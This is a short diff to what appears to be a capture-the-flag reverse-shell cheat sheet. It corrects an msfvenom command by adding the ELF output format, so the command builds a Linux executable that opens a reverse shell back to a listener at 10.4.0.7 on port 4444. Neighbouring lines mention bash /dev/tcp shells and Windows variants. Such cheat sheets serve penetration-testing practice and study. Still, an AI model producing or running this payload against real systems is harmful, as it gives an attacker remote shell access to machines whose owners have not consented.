@@ -40,7 +40,7 @@ Pure bash if /dev/tcp is available (rare on CTFs):
 
 Via msfvenom (still calling back to a nc listener), creating an executable called connect:
 
-`msfvenom -p linux/x64/shell_reverse_tcp lhost=10.4.0.7 lport=4444 > connect`
+`msfvenom -p linux/x64/shell_reverse_tcp lhost=10.4.0.7 lport=4444 -f elf > connect`
 
 For Windows:
 
